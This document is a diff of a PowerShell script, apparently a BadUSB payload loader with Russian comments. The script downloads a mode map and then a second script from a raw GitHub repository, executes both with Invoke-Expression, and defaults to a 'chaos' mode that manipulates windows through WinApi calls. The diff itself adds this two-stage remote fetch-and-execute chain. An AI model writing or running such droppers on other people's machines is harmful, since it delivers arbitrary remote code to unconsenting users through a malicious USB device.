@@ -1,28 +1,10 @@
-param (
-    [string]$mode = "kill"
-)
+param ([string]$mode = "chaos")
 
-# 1. Проверка сети
-if (-not [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable()) { exit }
-
+$repo = "https://raw.githubusercontent.com/ReAndrew/BadUSB_pws/refs/heads/main"
 $currentTag = "WindowDance_Instance"
 $host.ui.RawUI.WindowTitle = $currentTag
 
-# 2. Функция остановки других копий
-function Stop-AllDances {
-    [void](Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
-        $_.MainWindowTitle -eq $currentTag -and $_.Id -ne $PID 
-    } | Stop-Process -Force)
-}
-
-if ($mode -eq "kill" -or $mode -eq "stop") { Stop-AllDances; exit }
-Stop-AllDances
-
-# 3. Настройка приоритета
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-try { ([System.Diagnostics.Process]::GetCurrentProcess()).PriorityClass = if($isAdmin){"High"}else{"AboveNormal"} } catch{}
-
-# 4. Регистрация WinApi (будет доступно во всех подгружаемых скриптах)
+# --- Блок WinApi (Общий для всех) ---
 Add-Type -AssemblyName System.Windows.Forms
 $code = @"
 using System;
@@ -37,24 +19,40 @@ public class WinApi {
 "@
 Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
 
-# 5. Общие переменные среды
+# Общие переменные
 $SWP_FLAGS = 0x0001 -bor 0x0004 -bor 0x0010 -bor 0x4000
 $workArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
 
-# 6. Динамическая загрузка модуля из вашего GitHub
-$repoUrl = "https://raw.githubusercontent.com/ReAndrew/BadUSB_pws/refs/heads/main"
-$targetFile = "Win_$mode.ps1"
-$fullUrl = "$repoUrl/$targetFile"
+# Функция остановки
+function Stop-AllDances {
+    [void](Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
+        $_.MainWindowTitle -eq $currentTag -and $_.Id -ne $PID 
+    } | Stop-Process -Force)
+}
 
+# --- Логика Переходника ---
 try {
-    # Загружаем код режима
-    $scriptBlock = Invoke-RestMethod -Uri $fullUrl -ErrorAction Stop
+    # 1. Скачиваем карту-переходник
+    $mapData = Invoke-RestMethod -Uri "$repo/redirect.ps1"
+    $map = Invoke-Expression $mapData # Превращаем текст в объект-таблицу
+
+    # 2. Определяем, что делать
+    if ($map.ContainsKey($mode)) {
+        $target = $map[$mode]
+    } else {
+        $target = $map["chaos"] # Режим по умолчанию, если ничего не найдено
+    }
+
+    # 3. Обработка команды остановки
+    if ($target -eq "kill") { Stop-AllDances; exit }
+    Stop-AllDances
+
+    # 4. Загрузка и запуск конкретного скрипта
+    $scriptUrl = "$repo/$target"
+    $scriptCode = Invoke-RestMethod -Uri $scriptUrl
     
-    # Запускаем его в текущем контексте (чтобы были доступны WinApi и переменные)
-    Write-Host "Running mode: $mode" -ForegroundColor Green
-    Invoke-Expression $scriptBlock
-} 
-catch {
-    Write-Host "Error: Mode '$mode' not found in repository or connection failed." -ForegroundColor Red
-    exit
+    Write-Host "Starting mode: $mode (File: $target)" -ForegroundColor Cyan
+    Invoke-Expression $scriptCode
+} catch {
+    Write-Error "Failed to load script or map. Check internet connection or URLs."
 }
